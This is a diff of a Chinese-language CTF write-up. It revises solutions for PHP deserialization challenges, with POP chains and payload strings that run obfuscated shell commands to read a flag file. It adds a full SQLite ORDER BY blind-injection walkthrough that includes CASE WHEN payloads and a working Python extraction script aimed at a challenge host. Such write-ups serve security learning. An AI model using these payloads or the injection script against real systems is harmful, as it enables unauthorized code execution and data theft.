@@ -1018,6 +1018,7 @@ class FLAG
 {
     private $a = "create_function" ;
     protected $b=";}var_dump(`/usr/b??/?l /?lag`);/*";
+    //protected $b="};var_dump(`xxd /???g`);#";
 }
 $a = new FLAG();
 echo urlencode(serialize($a));
@@ -1112,7 +1113,15 @@ if (isset($_POST['ISCTF'])) {
 }
 ```
 
-有一个双重md5的弱比较，用md5碰撞脚本去碰一下
+先写链子
+
+```php
+begin::__destruct()->begin::__toString()->flaag::__invoke()->eenndd::__get()->eval()
+```
+
+在`flaag::__invoke()`中有一个双重md5的弱比较，需要做一个碰撞
+
+用md5碰撞脚本去碰一下
 
 ```python
 # -*- coding: utf-8 -*-
@@ -1155,12 +1164,6 @@ if __name__ == '__main__':
 ```
 
 ![image-20251223153532191](image/image-20251223153532191.png)
-
-先把链子写出来吧
-
-```php
-begin::__destruct()->begin::__toString()->flaag::__invoke()->eenndd::__get()
-```
 
 ## 最终的poc
 
@@ -1825,7 +1828,7 @@ echo urlencode(serialize($a));
 
 ![image-20251225145942670](image/image-20251225145942670.png)
 
-在`__get`中有一个\Writer::fetch()方法的调用，跟进看一下
+在`__get`中有一个`\Writer::fetch()`方法的调用，跟进看一下
 
 classes.php\Writer
 
@@ -2213,6 +2216,8 @@ echo urlencode(serialize($a));
 
 # kaqiWeaponShop
 
+## #sqlite order by盲注
+
 ![image-20251227145932129](image/image-20251227145932129.png)
 
 一共有三个参数
@@ -2223,8 +2228,142 @@ echo urlencode(serialize($a));
 
 id是武器编号，name是武器名，p是页数，测试之后发现其实p参数是没用的，他只是一个翻页的功能，并没有进行sql查询
 
-手测了一下，id是一个注入点但是只能接收数字，name的话估计
+传入`?id=1&name=剑&p=1`的时候会返回杖1和剑1，编号分别是1和2，但我传入`?id=3&name=剑&p=1`的时候则会返回剑1和刀1，编号分别是2和3
 
-![image-20251227150923177](image/image-20251227150923177.png)
+那大概的sql语句应该是or+order了
 
-嗯。。。不妨大胆的猜测一下这里的sql语句应该是一个or语句
+```sqlite
+SELECT id, name, img
+FROM weapons
+WHERE id = <id> OR name LIKE '%<name>%'
+ORDER BY id
+LIMIT 4 OFFSET <offset>
+```
+
+手测了一下，id是一个注入点但是只能接收数字，name的话估计是过滤了单双引号的
+
+但是id传入算术表达式的时候发现并没有执行加减法，感觉这里id还是带了引号的，只不过过滤掉了字符
+
+```sqlite
+SELECT id, name, img
+FROM weapons
+WHERE id = '<id>' OR name LIKE '%<name>%'
+ORDER BY id
+LIMIT 4 OFFSET <offset>
+```
+
+但是where子语句中的id和name都没法打
+
+一开始以为order后的id是固定的，后面发现这里也是可控的，传入name会根据name去排序，传入random()会随机排序
+
+那么这里的话就是打order by注入了
+
+判断注入点
+
+```sql
+?id=case when 1 then id else -id end	顺序排序
+?id=case when 0 then id else -id end	倒序排序
+```
+
+然后打注入就行了
+
+```sql
+?id=case when ((select 1 from flag limit 1)=1) then id else -id end	判断是否存在flag表
+?id=case when ((select flag from flag limit 1) is not null) then id else -id end	判断flag列是否存在且不为空
+?id=case when ((select length(flag) from flag limit 1)>42) then id else -id end		顺序
+?id=case when ((select length(flag) from flag limit 1)>43) then id else -id end		倒序，所以字段值为43
+```
+
+接着就是爆破flag了，可以发现这里很多函数都被禁了，但是可以用sqlite的一个特性，类似于php的弱比较，直接做字符串排序比较
+
+```python
+import requests
+import re
+import time
+
+url = "http://challenge.imxbt.cn:31395/"
+
+result = ""
+max_len = 100
+
+charset = "-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz{}"
+
+
+def is_true(payload):
+    params = {
+        "id": payload,
+        "name": "",
+        "p": 1,
+    }
+
+    r = requests.get(url, params=params, timeout=10)
+    text = r.text
+
+    ids = re.findall(r'/static/(\d+)\.jpg', text)
+
+    if ids[:4] == ["1", "2", "3", "4"]:
+        return True
+
+    if ids[:4] == ["8", "7", "6", "5"]:
+        return False
+
+    print("[!] unexpected response:", ids, payload)
+    raise SystemExit
+
+# 先二分长度
+head = 1
+tail = max_len
+
+while head < tail:
+    mid = (head + tail) // 2
+
+    payload = (
+        f"case when ((select length(flag) from flag limit 1)>{mid}) then id else -id end"
+    )
+
+    print("length payload:", payload)
+
+    if is_true(payload):
+        head = mid + 1
+    else:
+        tail = mid
+
+    time.sleep(0.03)
+
+length = head
+print("[+] length =", length)
+
+
+# 再按前缀比较恢复字符串
+for i in range(length):
+    head = 0
+    tail = len(charset) - 1
+    best = charset[0]
+
+    while head <= tail:
+        mid = (head + tail) // 2
+        ch = charset[mid]
+
+        test = result + ch
+
+        payload = (
+            f"case when ((select flag from flag limit 1)>='{test}') then id else -id end"
+        )
+
+        print("payload:", payload)
+
+        if is_true(payload):
+            best = ch
+            head = mid + 1
+        else:
+            tail = mid - 1
+
+        time.sleep(0.03)
+
+    result += best
+    print(result)
+
+print("flag: ", result)
+```
+
+![image-20260427011734031](image/image-20260427011734031.png)
